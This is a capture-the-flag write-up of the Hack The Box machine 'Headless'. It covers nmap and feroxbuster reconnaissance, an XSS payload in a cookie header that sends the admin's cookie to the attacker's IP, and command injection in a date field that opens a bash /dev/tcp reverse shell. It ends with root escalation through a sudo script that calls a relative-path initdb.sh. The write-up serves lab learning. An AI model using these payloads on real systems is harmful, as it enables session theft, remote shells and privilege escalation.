# [Headless](https://app.hackthebox.com/machines/Headless) Writeup [HTB]
## ⏯️ Credits
This was my first XXS/command injection challenge, and I was super lost. So I basically followed [this official video](https://www.youtube.com/watch?v=FDCpJbS1OuQ). It was great!

## 🗺️ Exploring the website
We begin by scanning the services that are exposed using `nmap`. 
We discover that port 5000 is open, and it's returning some HTML. Therefore, we connect to it using the browser.

The website appears to be under construction. We also notice that HTTP requests automatically set an `is_admin` cookie:
```
is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
```
We try to see whether it's written in base 64:
```sh
$ echo InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs | base64 -d
"user"base64: invalid input
```
We deduce that the first part determines our privileges (we are a simple user), while the second part looks like a signature. Interestingly enough, the cookie doesn't change when we reload the page, meaning there's no concept of session, and we can most likely steal the admin cookie.

Finally, we use `feroxbuster` to bruteforce the website directories. We find 2 of them:
- `/support`, containing a POST form;
- `/dashboard`, that we don't have access to (this most likely requires admin privileges).

## 🍪 Playing with the form
The contact form contains the following fields: first name, last name, email, phone number and message. Given that we want to steal that admin cookie, we begin by trying some POC XXS in the message field:
```html
<script>alert('AAA')</script>
```
The website is not happy about it, as it returns a "Hacking Attempt Detected" page, stating that the admin will be notified, and printing on screen the header of our POST request. Interesting... 
If the admin visualizes on screen the same exact header of our request, then we can inject some HTML script in it, and get the admin cookie nicely delivered to us!

To do so, we add a new, not-at-all-sketchy cookie: 
```html
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs;xxs=<script>fetch("http://10.10.14.136:4815/?"+document.cookie)</script>
```
where `10.10.14.136` is our vpn IP address.

We also open a channel on port 4815 to see our cookie:
```sh
$ nc -lvnkp 4815
```

We wait a few minutes and... voilà! The admin cookie has been delivered, right at our doorsteps!
```
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

## 🐚 Accessing the dashboard and getting the reverse shell
Now that we got admin privileges, we can easily access to the `/dashboard` page. This is another form-looking thing, asking for a date and retrieving website statistics for it.
We want to get some kind of shell on the app web server, so we try to inject commands in the `date` parameter of the HTTP POST body. As before, we begin with some POC:
```
date=2023-09-15;sleep 2
```
Bingo! The response takes around 2 seconds to arrive, meaning we can inject commands in the web server and get a well deserved reverse shell!
```
date=2023-09-15;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.136/4815+0>%261'
```
Here we are using the classic `bash -c 'bash -i >& /dev/tcp/10.10.14.136/4815 0>&1'`, which runs an interactive instance of bash and redirects everything to our local web server.

## 🫚 Becoming root and owning the ~~world~~ flag!
Now that we have our shell, we begin with some exploration:
```sh
$ whoami
dvir
$ sudo -l
[...]
User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```
From the HTB website, we know the flag is in the `/root` directory, which of course is not accessible to our peasant user.
However, we are still allowed to run this `/usr/bin/syscheck` script with root permissions. Interesting... 

The script is not very long. The most interesting part is this "if" clause:
```sh
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi
```
While all the other commands are called with their full name, this `./initdb.sh` script is called with its relative path. Moreover, since it's called by a process with root privileges, it will also have root privileges. Very convenient...

From our home directory (on which we have writing permissions), we create our own `initdb.sh` file. Useless to day, it will **__not__** initialize the database.
```sh
$ echo bash > initdb.sh
$ chmod +x initdb.sh
```
Now we are ready to run the system check!
```sh
$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.5G
System load average:  0.00, 0.00, 0.04
Database service is not running. Starting it...
$ whoami
root
$ ls /root
root.txt
$ cat /root/root.txt
<THE FLAG>
```
## 🚩 Conclusion and tools recap
That's all folks!

I really enjoyed this challenge, it was a good starting point for HTB and I learned a lot of useful stuff!

**__Tools recap__**
- `nmap` to scan ports: nmap -sC -sV -p- 10.10.11.8
- `feroxbuster` to bruteforce the website directories: feroxbuster --url http://10.10.11.8:5000 -w ~/snap/feroxbuster/common/raft-medium-directories.txt
- Burp Suite Community Edition to make and intercept HTTP requests


